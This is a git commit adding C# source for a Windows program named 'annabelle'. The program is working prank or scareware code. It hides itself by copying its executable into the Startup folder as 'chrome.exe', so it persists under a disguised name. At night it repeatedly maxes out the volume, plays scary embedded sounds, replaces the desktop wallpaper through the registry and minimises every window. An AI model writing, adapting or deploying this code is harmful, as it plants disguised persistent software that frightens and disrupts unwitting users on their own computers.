c752b3628ed92e547f294ffc8ce9d931c0ecc11e
Anh Tuan Nguyen <giaosudauto@hotmail.com>
2017-08-15 08:58:08 +0700

    Add project files.

---
+++ annabelle/mainForm.cs
@@ -0,0 +1,143 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Media;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace annabelle
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            this.timer1.Interval = 35 * 60 * 1000;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            AddToStartup();
+        }
+
+        private void playSound(int fileName)
+        {
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            SoundPlayer sp = new SoundPlayer(assembly.GetManifestResourceStream("annabelle.sound." + fileName.ToString() + ".wav"));
+            sp.Play();
+        }
+
+
+        private void AddToStartup()
+        {
+            try
+            {
+                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + "chrome.exe");
+            }
+            catch { }
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            if ((DateTime.Now.Hour >= 21 && DateTime.Now.Hour < 24)
+                || (DateTime.Now.Hour >= 0 && DateTime.Now.Hour <= 5))
+            {
+                Random rd = new Random();
+                int sound = rd.Next(0, 8);
+                int image = rd.Next(0, 11);
+                for (int i = 0; i < 50; i++) VolUp();
+                playSound(sound);
+                Wallpaper.Set(image, Wallpaper.Style.Centered);
+                showDesktop();
+            }
+        }
+
+        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
+        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
+        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);
+        const int WM_COMMAND = 0x111;
+        const int MIN_ALL = 419;
+        private void showDesktop()
+        {
+            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
+            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
+        }
+
+        private const int APPCOMMAND_VOLUME_MUTE = 0x80000;
+        private const int APPCOMMAND_VOLUME_UP = 0xA0000;
+        private const int APPCOMMAND_VOLUME_DOWN = 0x90000;
+        private const int WM_APPCOMMAND = 0x319;
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr SendMessageW(IntPtr hWnd, int Msg,
+            IntPtr wParam, IntPtr lParam);
+        
+        private void VolUp()
+        {
+            SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle,
+                (IntPtr)APPCOMMAND_VOLUME_UP);
+        }
+    }
+
+    public sealed class Wallpaper
+    {
+        Wallpaper() { }
+
+        const int SPI_SETDESKWALLPAPER = 20;
+        const int SPIF_UPDATEINIFILE = 0x01;
+        const int SPIF_SENDWININICHANGE = 0x02;
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+        public enum Style : int
+        {
+            Tiled,
+            Centered,
+            Stretched
+        }
+
+        public static void Set(int index, Style style)
+        {
+            Assembly assembly = Assembly.GetExecutingAssembly();
+            Stream s = assembly.GetManifestResourceStream("annabelle.image." + index.ToString() + ".png");
+            System.Drawing.Image img = System.Drawing.Image.FromStream(s);
+            string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
+            img.Save(tempPath, System.Drawing.Imaging.ImageFormat.Bmp);
+
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
+            if (style == Style.Stretched)
+            {
+                key.SetValue(@"WallpaperStyle", 2.ToString());
+                key.SetValue(@"TileWallpaper", 0.ToString());
+            }
+
+            if (style == Style.Centered)
+            {
+                key.SetValue(@"WallpaperStyle", 1.ToString());
+                key.SetValue(@"TileWallpaper", 0.ToString());
+            }
+
+            if (style == Style.Tiled)
+            {
+                key.SetValue(@"WallpaperStyle", 1.ToString());
+                key.SetValue(@"TileWallpaper", 1.ToString());
+            }
+
+            SystemParametersInfo(SPI_SETDESKWALLPAPER,
+                0,
+                tempPath,
+                SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
+        }
+    }
+}
